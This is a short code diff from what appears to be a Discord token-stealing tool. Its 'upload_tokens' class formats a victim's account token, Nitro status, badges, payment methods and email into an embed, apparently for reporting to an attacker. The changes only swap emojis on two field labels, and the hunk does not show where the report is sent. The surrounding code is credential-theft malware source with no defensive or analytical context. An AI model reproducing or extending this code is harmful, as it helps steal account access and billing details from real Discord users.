@@ -343,8 +343,8 @@ class upload_tokens:
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="🔓 Token", value=f"```{token}```", inline=False)
-            embed.add_field(name="🧬 Nitro", value=f"```{nitro}```", inline=True),
-            embed.add_field(name="🔖 Badges", value=f"```{badges if badges != '' else 'None'}```", inline=True)
+            embed.add_field(name="🫧 Nitro", value=f"```{nitro}```", inline=True),
+            embed.add_field(name="🪪 Badges", value=f"```{badges if badges != '' else 'None'}```", inline=True)
             embed.add_field(name="💰 Billing", value=f"```{payment_methods if payment_methods != '' else 'None'}```", inline=True)
 
             embed.add_field(name="📩 Email", value=f"```{email if email != None else 'None'}```", inline=True)
